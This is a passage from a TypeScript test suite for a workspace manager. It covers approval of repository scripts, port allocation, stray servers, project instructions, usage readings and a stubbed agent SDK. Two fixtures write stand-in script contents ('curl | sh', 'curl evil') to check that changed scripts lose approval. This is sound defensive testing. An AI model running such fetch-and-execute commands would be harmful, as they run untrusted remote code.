    const { workspaceId } = await withWorkspace()
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')

    const before = await service.workspaceScripts(workspaceId)
    expect(before.scripts.setup?.source).toBe('repoOctopus')
    expect(before.approved).toBe(false)

    await approveScriptsIn(service, workspaceId)
    await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({ approved: true })
  })

  it('asks again once the repository changes what it runs', async () => {
    // The point of a digest rather than a flag: a `git pull` that rewrites the
    // build script is a new thing to read.
    const { workspaceId } = await withWorkspace()
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
    await approveScriptsIn(service, workspaceId)

    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\ncurl | sh\n')

    await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({ approved: false })
  })

  it('records nothing when there is nothing to record', async () => {
    const { projectId, workspaceId } = await withWorkspace()

    await approveScriptsIn(service, workspaceId)

    // An empty list rather than a digest of nothing, so the panel keeps telling
    // "no repository scripts" apart from "approved".
    expect(service.listProjects().find((p) => p.id === projectId)?.approvedScripts).toEqual([])
  })

  it('answers for the checkout itself, which is what Project settings asks', async () => {
    // Settings opens with no workspace as often as with one, and every worktree
    // is cut from this checkout.
    const { projectId, repo } = await withWorkspace()
    await carryScript(repo, 'run.sh', '#!/bin/sh\nmake s\n')

    const answer = await service.projectScripts(projectId, null)

    expect(answer.scripts.run?.source).toBe('repoOctopus')
    expect(answer.approved).toBe(false)
  })

  it('answers about the workspace when one is open, not about the checkout', async () => {
    /*
     * The defect this fixes, from the real app. planner's checkout sat on a
     * branch with one set of scripts while every worktree was cut from one
     * carrying another — so Project settings named three scripts that were
     * never going to run, and marked the editors read-only against them.
     */
    const { projectId, workspaceId, repo } = await withWorkspace()

    await carryScript(repo, 'setup.sh', "#!/bin/sh\n# the checkout's\n")
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', "#!/bin/sh\n# the worktree's\n")

    const forWorkspace = await service.projectScripts(projectId, workspaceId)
    expect(forWorkspace.scripts.setup?.contents).toContain("the worktree's")

    // And the checkout is still the answer when there is no workspace to ask
    // about, which is how the dialog opens from the sidebar.
    const forCheckout = await service.projectScripts(projectId, null)
    expect(forCheckout.scripts.setup?.contents).toContain("the checkout's")
  })

  it('lets a trusted repository run without being read first', async () => {
    // The switch in Project settings. Off, every version is shown once; on,
    // whatever the checkout holds runs — reasonable for a repository you write.
    const { projectId, repo } = await withWorkspace()
    await carryScript(repo, 'run.sh', '#!/bin/sh\nmake s\n')
    await service.updateProjectById(projectId, { trustRepoScripts: true })

    await expect(service.projectScripts(projectId, null)).resolves.toMatchObject({
      approved: true
    })
  })

  it('refuses to allow scripts that changed after they were shown', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake\n')
    const shown = await service.workspaceScripts(workspaceId)

    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\ncurl evil\n')

    await expect(
      service.approveScripts(projectId, workspaceId, shown.digest)
    ).rejects.toMatchObject({ code: 'trustChanged' })
    expect(service.listProjects()[0]?.approvedScripts).toEqual([])
  })

  // Chosen against, the repository's script is not resolved — so there is
  // nothing of the repository's to approve, and Run is not held back by it.
  it("runs the project's own script once the user chose it, with nothing to approve", async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nrepo\n')
    await service.saveProjectScript(projectId, 'setup', '#!/bin/sh\nmine\n')

    await service.editProjectById(projectId, {
      kind: 'preferLocal',
      item: 'script.setup',
      on: true
    })

    await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({
      approved: true,
      digest: '',
      scripts: { setup: { source: 'project' } }
    })
  })

  it("runs a trusted repository's scripts unread", async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake\n')

    await service.updateProjectById(projectId, { trustRepository: true })

    await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({ approved: true })
  })

  it('refuses a workspace it does not know', async () => {
    await expect(service.workspaceScripts('missing')).rejects.toThrow()
    await expect(service.approveScripts('missing', null, 'x')).rejects.toThrow()
    await expect(service.projectScripts('missing', null)).rejects.toThrow()
  })
})

describe('the port a workspace serves on', () => {
  async function withWorkspace(): Promise<{ id: string; port: number }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    return { id: workspace.id, port: workspace.port }
  }

  // A pool of blocks, lowest first, so the numbers read in the order the
  // workspaces were made.
  it('hands out a block from the pool', async () => {
    const { port } = await withWorkspace()

    expect(port).toBe(POOL_START)
  })

  it('gives the next workspace the next block', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    const first = await service.createWorkspaceIn(project.id)
    const second = await service.createWorkspaceIn(project.id)

    expect(second.port).toBe(first.port + BLOCK)
  })

  // A block is free only if nothing answers on it — ours or anybody else's.
  it('steps over a block something else already answers on', async () => {
    answering.add(POOL_START)

    const { port } = await withWorkspace()

    expect(port).toBe(POOL_START + BLOCK)
  })

  // Nothing of ours is running, so whatever answers is somebody else's — which
  // is exactly what makes the answer knowable here.
  it('keeps the port when nothing is answering on it', async () => {
    const { id, port } = await withWorkspace()

    await expect(service.ensureWorkspacePort(id)).resolves.toBe(port)
  })

  /*
   * The whole point. A port free when the workspace was made can belong to
   * something else by the time anybody runs it, and the old scheme handed it
   * out anyway — the server then failed as it bound, blaming itself.
   */
  it('moves to a free block when something has taken its port', async () => {
    const { id, port } = await withWorkspace()
    // A second workspace, so the block it holds is one this move steps over.
    const project = service.listProjects()[0]
    await service.createWorkspaceIn(project?.id ?? '')

    answering.add(port)

    const settled = await service.ensureWorkspacePort(id)

    expect(settled).not.toBe(port)
    // Persisted, not just answered: the pane and the link both read it back.
    const stored = await service.listWorkspaces(project?.id ?? '')
    expect(stored.find((workspace) => workspace.id === id)?.port).toBe(settled)
  })

  /*
   * The choice has to be serialised, not only the write. Each settlement reads
   * the ports every other workspace holds, then awaits a probe per block, then
   * commits — so two overlapping calls both saw a pool in which neither had
   * moved, and both took the same block.
   */
  it('hands two workspaces settling at once two different blocks', async () => {
    const { id: first, port } = await withWorkspace()
    const project = service.listProjects()[0]
    const second = await service.createWorkspaceIn(project?.id ?? '')

    // Something on the first workspace's port, so both have to move — which is
    // what puts them in the window where they can choose alike.
    answering.add(port)

    const [a, b] = await Promise.all([
      service.ensureWorkspacePort(first),
      service.ensureWorkspacePort(second.id)
    ])

    expect(a).not.toBe(b)
  })

  // A failure must not stop the workspace queued behind it from being served.
  it('settles the next port after one that could not be settled', async () => {
    const { id } = await withWorkspace()

    await expect(
      Promise.all([
        service.ensureWorkspacePort('missing').catch(() => 'refused'),
        service.ensureWorkspacePort(id)
      ])
    ).resolves.toEqual(['refused', expect.any(Number)])
  })

  it('refuses to settle a port for a workspace that does not exist', async () => {
    await expect(service.ensureWorkspacePort('missing')).rejects.toThrow()
  })
})

describe('a workspace\u2019s port', () => {
  // octopus assigns the port and hands it over as `$OCTOPUS_PORT`; a script is
  // free to bind its framework's own default instead, and then the link the
  // pane offers opens on nothing.
  it('reports nothing listening on a port nobody bound', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await expect(service.isWorkspaceServing(workspace.id)).resolves.toBe(false)
  })

  it('reports a server once something answers on its port', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    answering.add(workspace.port)

    await expect(service.isWorkspaceServing(workspace.id)).resolves.toBe(true)
  })

  // The probe a test does not replace is the real one, which opens a socket.
  it('asks the machine when no probe is given', async () => {
    const real = await makeService(paths(dir))
    started.push(real)
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await real.addProjectFromPath(repo)
    const workspace = await real.createWorkspaceIn(project.id)
    const server = createServer()
    await new Promise<void>((resolve, reject) => {
      server.once('error', reject)
      server.listen(workspace.port, '127.0.0.1', resolve)
    })

    try {
      await expect(real.isWorkspaceServing(workspace.id)).resolves.toBe(true)
    } finally {
      await new Promise((resolve) => server.close(resolve))
    }
  })

  it('refuses to ask about a workspace that does not exist', async () => {
    await expect(service.isWorkspaceServing('missing')).rejects.toThrow()
  })
})

describe('servers left running in a workspace', () => {
  async function workspaceWithServer(): Promise<{
    workspace: string
    strays: OctopusService
    signals: [number, NodeJS.Signals][]
  }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    const cwd = await realpath(workspace.path)

    // One Rails server the agent left behind, which leaves when signalled.
    let alive = true
    const signals: [number, NodeJS.Signals][] = []
    const strays = await createService({
      ...paths(dir),
      strays: {
        lsof: (args) =>
          Promise.resolve(
            !alive ? '' : args.includes('-iTCP') ? 'p76404\ncruby\nn*:3110\n' : `p76404\nn${cwd}\n`
          ),
        kill: (pid, signal) => {
          signals.push([pid, signal])
          alive = false
        },
        sleep: () => Promise.resolve()
      }
    })

    return { workspace: workspace.id, strays, signals }
  }

  it("finds a server serving from the workspace's worktree", async () => {
    const { workspace, strays } = await workspaceWithServer()

    await expect(strays.findStrayServers(workspace)).resolves.toEqual([
      { pid: 76404, command: 'ruby', ports: [3110] }
    ])
  })

  it('stops it', async () => {
    const { workspace, strays, signals } = await workspaceWithServer()

    await strays.stopStrayServers(workspace, [76404])

    expect(signals).toEqual([[76404, 'SIGTERM']])
    await expect(strays.findStrayServers(workspace)).resolves.toEqual([])
  })

  // The tools a test does not replace are the real ones, and a fresh worktree
  // has nothing serving from it.
  it('asks the machine when no tools are given', async () => {
    const real = await makeService(paths(dir))
    started.push(real)
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await real.addProjectFromPath(repo)
    const workspace = await real.createWorkspaceIn(project.id)

    await expect(real.findStrayServers(workspace.id)).resolves.toEqual([])
  })

  it('refuses a workspace that does not exist', async () => {
    await expect(service.findStrayServers('missing')).rejects.toBeInstanceOf(WorkspaceError)
    await expect(service.stopStrayServers('missing', [1])).rejects.toBeInstanceOf(WorkspaceError)
  })
})

describe('what the application costs', () => {
  it('charges an agent to the workspace whose worktree it runs in', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    // Filled in once the workspace exists; the table is only read after that.
    let workspacePath = ''
    const measuring = await createService({
      ...paths(dir),
      processExec: (command) =>
        Promise.resolve(
          command === 'ps'
            ? '10 1 1.0 100\n11 10 4.0 400\n12 10 2.0 200\n'
            : `p11\nfcwd\nn${workspacePath}\np12\nfcwd\nn/\n`
        )
    })
    const project = await measuring.addProjectFromPath(repo)
    const workspace = await measuring.createWorkspaceIn(project.id)
    workspacePath = workspace.path

    const reading = await measuring.measureResources(10, [])

    expect(reading.parts).toEqual([
      { workspaceId: workspace.id, kind: 'agent', cpu: 4, memory: 400 * 1024 }
    ])
    expect(reading.app).toEqual({ cpu: 3, memory: 300 * 1024 })
  })

  // The table a test does not replace is the machine's own.
  it('reads the machine when no executor is given', async () => {
    const reading = await service.measureResources(process.pid, [])

    expect(reading.total.memory).toBeGreaterThan(0)
  })
})

describe('project instructions', () => {
  async function withProject(): Promise<string> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    return (await service.addProjectFromPath(repo)).id
  }

  it('offers a template before anything has been written', async () => {
    const id = await withProject()
    await expect(service.readProjectInstruction(id, 'pullRequest')).resolves.toContain(
      'Pull request'
    )
  })

  it('reads back what was saved', async () => {
    const id = await withProject()
    await service.saveProjectInstruction(id, 'pullRequest', 'Always link the issue.\n')

    await expect(service.readProjectInstruction(id, 'pullRequest')).resolves.toBe(
      'Always link the issue.\n'
    )
  })

  it('keeps one project instructions out of another', async () => {
    const first = await withProject()

    const other = join(dir, 'esl')
    await initRepo(other)
    const second = (await service.addProjectFromPath(other)).id

    await service.saveProjectInstruction(first, 'pullRequest', 'first\n')

    await expect(service.readProjectInstruction(second, 'pullRequest')).resolves.toContain(
      'Pull request'
    )
  })

  it('refuses a project that does not exist', async () => {
    await expect(service.readProjectInstruction('missing', 'pullRequest')).rejects.toThrow()
    await expect(service.saveProjectInstruction('missing', 'pullRequest', 'x')).rejects.toThrow()
  })

  /*
   * The installation's own belongs to no project, so there is nothing to check
   * it against — and it has to be writable before any project exists.
   */
  it('reads and writes the installation instruction without a project', async () => {
    await service.saveProjectInstruction(null, 'pullRequest', 'Say why.\n')

    await expect(service.readProjectInstruction(null, 'pullRequest')).resolves.toBe('Say why.\n')
  })

  /*
   * What a workspace would actually send. Resolved here rather than in the
   * renderer, which would have to know the order of precedence and ask twice to
   * apply it.
   */
  it("resolves a workspace's instruction, the project's over the installation's", async () => {
    const projectId = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await service.saveProjectInstruction(null, 'pullRequest', 'Global rules.\n')
    await expect(service.readEffectiveInstruction(workspace.id, 'pullRequest')).resolves.toBe(
      'Global rules.\n'
    )

    await service.saveProjectInstruction(projectId, 'pullRequest', 'Project rules.\n')
    await expect(service.readEffectiveInstruction(workspace.id, 'pullRequest')).resolves.toBe(
      'Project rules.\n'
    )
  })

  it('refuses to resolve one for a workspace that is not there', async () => {
    await expect(service.readEffectiveInstruction('missing', 'pullRequest')).rejects.toThrow()
  })

  /*
   * A project that wrote none inherits the installation's, and its editor
   * used to open on the template instead — one text on screen, another sent,
   * and the template saved over the inherited one the moment it was touched.
   */
  it("opens a project's editor on the installation's when the project wrote none", async () => {
    const id = await withProject()
    await service.saveProjectInstruction(null, 'pullRequest', 'Global rules.\n')

    await expect(service.readProjectInstruction(id, 'pullRequest')).resolves.toBe('Global rules.\n')
  })

  /*
   * "Use mine instead". The repository's instruction wins by default; chosen
   * against, it is not read at all and the project's chain answers.
   */
  it("sends the project's own once the user chose it over the repository's", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await mkdir(join(repo, '.octopus', 'instructions'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'instructions', 'pull-request.md'), 'Repo.\n', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'instructions'], { cwd: repo })
    const projectId = (await service.addProjectFromPath(repo)).id
    const workspace = await service.createWorkspaceIn(projectId)
    await service.saveProjectInstruction(projectId, 'pullRequest', 'Mine.\n')

    await expect(service.readEffectiveInstruction(workspace.id, 'pullRequest')).resolves.toBe(
      'Repo.\n'
    )

    await service.editProjectById(projectId, {
      kind: 'preferLocal',
      item: 'instruction.pullRequest',
      on: true
    })

    await expect(service.readEffectiveInstruction(workspace.id, 'pullRequest')).resolves.toBe(
      'Mine.\n'
    )
    const sources = await service.projectSources(projectId, workspace.id)
    expect(sources.find((view) => view.id === 'instruction.pullRequest')).toMatchObject({
      effective: 'project',
      preferLocal: true
    })
  })

  it('refuses to list the sources of a project that does not exist', async () => {
    await expect(service.projectSources('missing', null)).rejects.toThrow()
  })
})

describe('whether two account readings say the same thing', () => {
  const window = (
    key: UsageLimit['key'],
    utilization: number,
    resetsAt: string | null = null
  ): UsageLimit => ({ key, label: null, utilization, resetsAt, severity: null, binding: false })

  const reading = (limits: UsageLimit[], readAt = 'a'): UsageWindows => ({
    limits,
    limitsApply: true,
    readAt,
    asOf: null
  })

  it('is true for two readings of the same figures', () => {
    expect(
      sameWindows(
        reading([window('five_hour', 31, 'x'), window('seven_day', 84)]),
        reading([window('five_hour', 31, 'x'), window('seven_day', 84)])
      )
    ).toBe(true)
  })

  // The figures can be the same number twice and one of them an hour old; the
  // footnote saying so has to be redrawn, or it stays on a figure that is live.
  it('is false when the same figures have a different age', () => {
    const limits = [window('five_hour', 31, 'x')]

    expect(
      sameWindows(
        { ...reading(limits), asOf: '2026-08-12T10:00:00.000Z' },
        { ...reading(limits), asOf: null }
      )
    ).toBe(false)
  })

  /*
   * `readAt` moves on every read and says nothing about the account. Compared,
   * it would call every reading a change and put the state file under the
   * busiest path in the app to record a number that had not moved.
   */
  it('ignores when the reading was taken', () => {
    expect(
      sameWindows(reading([window('five_hour', 31)], 'a'), reading([window('five_hour', 31)], 'b'))
    ).toBe(true)
  })

  it('is false when a share moved, and when only a reset moment did', () => {
    expect(
      sameWindows(reading([window('five_hour', 31)]), reading([window('five_hour', 32)]))
    ).toBe(false)
    expect(
      sameWindows(reading([window('five_hour', 31, 'x')]), reading([window('five_hour', 31, 'y')]))
    ).toBe(false)
  })

  // An account that starts reporting a window, or stops, is a change — and so
  // is the same list in a different order, which is the order they are drawn in.
  it('is false when the windows themselves differ', () => {
    expect(sameWindows(reading([window('five_hour', 31)]), reading([]))).toBe(false)
    expect(
      sameWindows(
        reading([window('five_hour', 31), window('seven_day', 84)]),
        reading([window('seven_day', 84), window('five_hour', 31)])
      )
    ).toBe(false)
  })

  // A window the server labelled itself: two models can report the same share
  // and they are not the same window.
  it('is false when only the server label differs', () => {
    const fable = { ...window('model_scoped', 15), label: 'Fable' }
    const opus = { ...window('model_scoped', 15), label: 'Opus' }

    expect(sameWindows(reading([fable]), reading([opus]))).toBe(false)
  })

  // Whether the account has a plan at all is part of the reading: a session
  // that stops reporting windows is not the same answer as one that never had
  // any.
  it('is false when one side has no plan and the other does', () => {
    expect(
      sameWindows(reading([]), { limits: [], limitsApply: false, readAt: 'a', asOf: null })
    ).toBe(false)
  })

  it('is true when both sides report no windows at all', () => {
    expect(sameWindows(reading([]), reading([]))).toBe(true)
  })

  // Nothing read yet is not the same as a reading of nothing, or the first
  // reading after a launch would never be written.
  it('is false against a reading that has never been taken', () => {
    expect(sameWindows(reading([]), null)).toBe(false)
  })
})

describe('the agent chat', () => {
  /**
   * A stand-in for the Agent SDK.
   *
   * `query` is a service option for exactly this: the whole chat can be driven
   * end to end — messages out, events in, a permission answered — without a
   * child process, a network call or a model.
   */
  interface FakeAgent {
    /** Pushes a message as though the agent had emitted it. */
    readonly emit: (message: SDKMessage) => void
    readonly finish: (error?: Error) => void
    /** Calls the SDK's `canUseTool`, which is what blocks on our dialog. */
    readonly ask: (
      toolName: string,
      input?: unknown,
      decisionReason?: string,
      suggestions?: readonly PermissionUpdate[],
      extra?: { signal?: AbortSignal; suppressAlwaysAllowRule?: boolean; agentID?: string }
    ) => Promise<unknown>
    /** Calls the SDK's `onElicitation`, which is what an MCP server blocks on. */
    readonly elicit: (request: Record<string, unknown>) => Promise<{ action: string }>
    readonly sent: string[]
    /** The id each message carried, in step with `sent`. */
    readonly sentIds: (string | undefined)[]
    /** Every `rewindFiles` the session was asked for. */
    readonly rewinds: () => { messageId: string; dryRun: boolean }[]
    readonly interrupted: () => number
    /** Every background task the session was told to stop, in order. */
    readonly stoppedTasks: () => string[]
    readonly closed: () => number
    /** How many times this session was asked what `/usage` answers. */
    readonly usageAsked: () => number
    /** The options each ask for what `/usage` answers carried, in order. */
    readonly usageOptions: () => unknown[]
    /** Every side question this session was asked, as the SDK received it. */
    readonly sideAsks: () => unknown[][]
    /** Permission modes the session was switched to, in order. */
    readonly modes: () => string[]
    /** Settings pushed onto the running session — where effort and skills land. */
    readonly flagSettings: () => {
      effortLevel?: string
      skillOverrides?: Record<string, string>
    }[]
    /** Models asked for mid-session; `undefined` is "back to the default". */
    readonly requestedModels: () => (string | undefined)[]
    readonly options: () => Record<string, unknown>
    /** How many times the session was told to load the plugins again. */
    readonly pluginReloads: () => number
  }

  /** Both responses as build 2.1.228 actually sent them, trimmed. */
  const CONTEXT_RESPONSE = {
    totalTokens: 23_921,
    maxTokens: 1_000_000,
    rawMaxTokens: 1_000_000,
    percentage: 2,
    autoCompactThreshold: 967_000,
    isAutoCompactEnabled: true,
    // The reading that also names the running model, which is what the footer
    // shows when nobody picked one here.
    model: 'claude-opus-5[1m]'
  }

  const USAGE_RESPONSE = {
    session: {
      total_cost_usd: 0,
      total_api_duration_ms: 0,
      total_duration_ms: 695,
      total_lines_added: 0,
      total_lines_removed: 0,
      model_usage: {}
    },
    subscription_type: 'max',
    rate_limits_available: true,
    rate_limits: {
      five_hour: { utilization: 18, resets_at: '2026-08-12T19:50:00.149775+00:00' },
      seven_day: { utilization: 84, resets_at: '2026-08-12T22:00:00.149796+00:00' }
    }
  }

  /** Every session the service started, newest last. */
  let agents: FakeAgent[]

  /**
   * What the agent answers when asked which models the account may use.
   *
   * A variable rather than a parameter because the ask happens inside
   * `startFor`, which no test calls directly — it is reached by sending a
   * message, and the answer has to be in place before that.
   */
  let offered: () => Promise<ModelInfo[]>
  /** The same, for the slash commands this worktree offers. */
  let offeredCommands: () => Promise<SlashCommand[]>
  let offeredAgents: () => Promise<AgentInfo[]>
  /** What the session answers about its context window, and the account's. */
  let contextAnswer: () => Promise<unknown>
  let skillReload: () => Promise<unknown>
  /** What the session answers when its flags are set. */
  let flagsAnswer: () => Promise<void>
  let pluginReload: () => Promise<unknown>
  let usageAnswer: () => Promise<unknown>
  /** Null is a CLI with no side-question call at all. */
  let sideAnswer: (() => Promise<unknown>) | null
  /** What the session answers when asked to put the files back to a message. */
  let rewindAnswer: () => Promise<unknown>
  /** How setting the session's mode settles — held, to make a send wait on it. */
  let modeAnswer: (mode: string) => Promise<void>

  function fakeQuery(): QueryFn {
    return (params) => {
      const queued: SDKMessage[] = []
      const sent: string[] = []
      const sentIds: (string | undefined)[] = []
      const rewinds: { messageId: string; dryRun: boolean }[] = []
      let wake: (() => void) | null = null
      let done = false
      let failure: Error | null = null
      const modes: string[] = []
      const flagSettings: { effortLevel?: string; skillOverrides?: Record<string, string> }[] = []
      const requestedModels: (string | undefined)[] = []
      let interrupted = 0
      const stoppedTasks: string[] = []
      let closed = 0
      let usageAsked = 0
      let pluginReloads = 0
      const usageOptions: unknown[] = []
      const sideAsks: unknown[][] = []

      const options = (params.options ?? {}) as unknown as Record<string, unknown>

      void (async () => {
        for await (const message of params.prompt) {
          // A user message the service sends carries plain text; the block
          // shape belongs to tool results, which travel the other way.
          const { content } = message.message
          if (typeof content === 'string') {
            sent.push(content)
            sentIds.push(message.uuid)
          }
        }
      })()

      const push = (): void => {
        const pending = wake
        wake = null
        pending?.()
      }

      async function* stream(): AsyncGenerator<SDKMessage> {
        while (!done || queued.length > 0) {
          const next = queued.shift()
          if (next) {
            yield next
            continue
          }
          if (failure) throw failure

          await new Promise<void>((resolve) => {
            wake = resolve
          })
        }
        if (failure) throw failure
      }

      agents.push({
        sent,
        sentIds,
        rewinds: () => rewinds,
        emit: (message) => {
          queued.push(message)
          push()
        },
        finish: (error) => {
          failure = error ?? null
          done = true
          push()
        },
        ask: (toolName, input = {}, decisionReason, suggestions, extra = {}) => {
          const canUseTool = options.canUseTool
          if (typeof canUseTool !== 'function') throw new Error('no canUseTool')
          // All three arguments, as the SDK passes them. The third is where the
          // bridge explains itself, and leaving it out of the fake is how it
          // went unread for as long as it did.
          return (
            canUseTool as (
              name: string,
              input: unknown,
              options: {
                signal: AbortSignal
                decisionReason?: string
                suggestions?: readonly PermissionUpdate[]
                suppressAlwaysAllowRule?: boolean
                agentID?: string
              }
            ) => Promise<unknown>
          )(toolName, input, {
            signal: extra.signal ?? new AbortController().signal,
            ...(decisionReason !== undefined && { decisionReason }),
            ...(suggestions !== undefined && { suggestions }),
            ...(extra.suppressAlwaysAllowRule !== undefined && {
              suppressAlwaysAllowRule: extra.suppressAlwaysAllowRule
            }),
            ...(extra.agentID !== undefined && { agentID: extra.agentID })
          })
        },
        elicit: (request) => {
          const onElicitation = options.onElicitation
          if (typeof onElicitation !== 'function') throw new Error('no onElicitation')

          return (
            onElicitation as (
              request: Record<string, unknown>,
              options: { signal: AbortSignal }
            ) => Promise<{ action: string }>
          )(request, { signal: new AbortController().signal })
        },
        interrupted: () => interrupted,
        stoppedTasks: () => stoppedTasks,
        closed: () => closed,
        usageAsked: () => usageAsked,
        usageOptions: () => usageOptions,
        sideAsks: () => sideAsks,
        flagSettings: () => flagSettings,
        requestedModels: () => requestedModels,
        modes: () => modes,
        options: () => options,
        pluginReloads: () => pluginReloads
      })

      return Object.assign(stream(), {
        interrupt: () => {
          interrupted++
          return Promise.resolve(undefined)
        },
        stopTask: (taskId: string) => {
          stoppedTasks.push(taskId)
          return Promise.resolve()
        },
        applyFlagSettings: (settings: {
          effortLevel?: string
          skillOverrides?: Record<string, string>
        }) => {
          flagSettings.push(settings)
          return flagsAnswer()
        },
        reloadSkills: () => skillReload(),
        reloadPlugins: () => {
          pluginReloads++
          return pluginReload()
        },
        rewindFiles: (messageId: string, rewindOptions?: { dryRun?: boolean }) => {
          rewinds.push({ messageId, dryRun: rewindOptions?.dryRun === true })
          return rewindAnswer()
        },
        setModel: (model: string | undefined) => {
          requestedModels.push(model)
          return Promise.resolve()
        },
        supportedModels: () => offered(),
        supportedCommands: () => offeredCommands(),
        supportedAgents: () => offeredAgents(),
        getContextUsage: () => contextAnswer(),
        usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET: (options?: unknown) => {
          usageAsked++
          usageOptions.push(options)
          return usageAnswer()
        },
        ...(sideAnswer !== null && {
          askSideQuestion: (...args: unknown[]) => {
            sideAsks.push(args)
            return sideAnswer?.()
          }
        }),
        setPermissionMode: (mode: string) => {
          modes.push(mode)
          return modeAnswer(mode)
        },
        close: () => {
          closed++
        }
      }) as unknown as Query
    }
  }

  /** A session that ends without ever saying anything. */
  async function* silence(): AsyncGenerator<SDKMessage> {
    await Promise.resolve()
    yield* []
  }

  /** The first session in flight — most tests here drive a single chat. */
  function agent(): FakeAgent {
    const [only] = agents
    if (!only) throw new Error('no session was started')
    return only
  }

  function textMessage(text: string): SDKMessage {
    return {
      type: 'assistant',
      message: { content: [{ type: 'text', text }] },
      parent_tool_use_id: null,
      uuid: 'u-1',
      session_id: 'sess-1'
    } as unknown as SDKMessage
  }

  function toolCallMessage(id: string, name: string, input: unknown): SDKMessage {
    return {
      type: 'assistant',
      message: { content: [{ type: 'tool_use', id, name, input }] },
      parent_tool_use_id: null,
      uuid: 'u-tool',
      session_id: 'sess-1'
    } as unknown as SDKMessage
  }

  /** A tool's answer travels in the user role — the SDK models it as given *to* the model. */
  function toolResultMessage(id: string, ok: boolean, content = 'done'): SDKMessage {
    return {
      type: 'user',
      message: {
        content: [{ type: 'tool_result', tool_use_id: id, is_error: !ok, content }]
      },
      parent_tool_use_id: null,
      uuid: 'u-result',
      session_id: 'sess-1'
    } as unknown as SDKMessage
  }

  const initMessage = {
    type: 'system',
    subtype: 'init',
    session_id: 'sess-1',
    permissionMode: 'default'
  } as unknown as SDKMessage

  /** A session that will not take auto mode, and takes every other one. */
  function refuseAuto(reason: string): (mode: string) => Promise<void> {
    return (mode) => (mode === 'auto' ? Promise.reject(new Error(reason)) : Promise.resolve())
  }

  const resultMessage = {
    type: 'result',
    subtype: 'success',
    is_error: false,
    total_cost_usd: 0.02,
    duration_ms: 1200,
    usage: { input_tokens: 4200, output_tokens: 310 },
    terminal_reason: 'completed',
    session_id: 'sess-1'
  } as unknown as SDKMessage

  /** What a session that was stopped says last. */
  const abortedResultMessage = {
    type: 'result',
    subtype: 'error_during_execution',
    is_error: true,
    total_cost_usd: 0,
    duration_ms: 1,
    usage: { input_tokens: 1, output_tokens: 1 },
    terminal_reason: 'aborted',
    session_id: 'sess-1'
  } as unknown as SDKMessage

  /** A service with a project, a workspace and a stubbed agent. */
  async function withWorkspace(extra: ServiceOptions = {}): Promise<{
    service: OctopusService
    projectId: string
    workspaceId: string
    events: ChatEvent[]
  }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService({ ...paths(dir), query: fakeQuery(), ...extra })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const events: ChatEvent[] = []
    service.onAgentEvent((event) => events.push(event))

    return { service, projectId: project.id, workspaceId: workspace.id, events }
  }

  beforeEach(() => {
    agents = []
    modeAnswer = () => Promise.resolve()
    offered = () => Promise.resolve([])
    offeredCommands = () => Promise.resolve([])
    offeredAgents = () => Promise.resolve([])
    contextAnswer = () => Promise.resolve(CONTEXT_RESPONSE)
    skillReload = () => Promise.resolve({ skills: [] })
    flagsAnswer = () => Promise.resolve()
    pluginReload = () =>
      Promise.resolve({ commands: [], agents: [], plugins: [], mcpServers: [], error_count: 0 })
    usageAnswer = () => Promise.resolve(USAGE_RESPONSE)
    sideAnswer = () => Promise.resolve({ response: 'It is a flag.', synthetic: false })
    rewindAnswer = () =>
      Promise.resolve({
        canRewind: true,
        filesChanged: ['a.ts', 'b.ts'],
        insertions: 12,
        deletions: 4
      })
  })

  const lifecycle = (command_uuid: string, state: string): SDKMessage =>
    ({
      type: 'command_lifecycle',
      command_uuid,
      state,
      uuid: 'frame',
      session_id: 'sess-1'
    }) as unknown as SDKMessage

  describe('a turn a pull request button started', () => {
    const ORIGIN = 'https://github.com/o/r.git'

    /** A workspace whose git records every push rather than making it, with `origin` where the test says. */
    async function recording(push: () => Promise<string> = () => Promise.resolve('')): Promise<
      Awaited<ReturnType<typeof withWorkspace>> & {
        chat: Awaited<ReturnType<OctopusService['openChat']>>
        branch: string | undefined
        pushes: string[][]
        moveOrigin: (url: string) => void
      }
    > {
      const pushes: string[][] = []
      let origin = ORIGIN
      const setup = await withWorkspace({
        makeExec: (cwd, options) => {
          const exec = gitIn(cwd, options)
          return (args) => {
            if (args[0] === 'remote' && args[1] === 'get-url') return Promise.resolve(`${origin}\n`)
            if (args[0] !== 'push') return exec(args)
